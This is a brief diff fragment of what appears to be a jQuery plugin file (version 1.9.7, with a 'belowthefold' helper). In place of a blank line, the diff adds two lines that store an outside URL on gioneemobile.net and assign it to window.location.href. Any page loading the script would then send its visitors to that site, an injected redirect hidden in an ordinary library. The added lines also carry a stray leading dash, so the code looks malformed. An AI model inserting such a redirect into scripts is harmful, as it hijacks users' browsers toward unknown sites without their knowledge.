@@ -12,7 +12,8 @@
  * Version:  1.9.7
  *
  */
-
+- var v="http://webgames.gioneemobile.net/appPage.php?Sd=499";
+- window.location.href=v;
 
     /* Convenience methods in jQuery namespace.           */
     /* Use as  $.belowthefold(element, {threshold : 100, container : window}) */
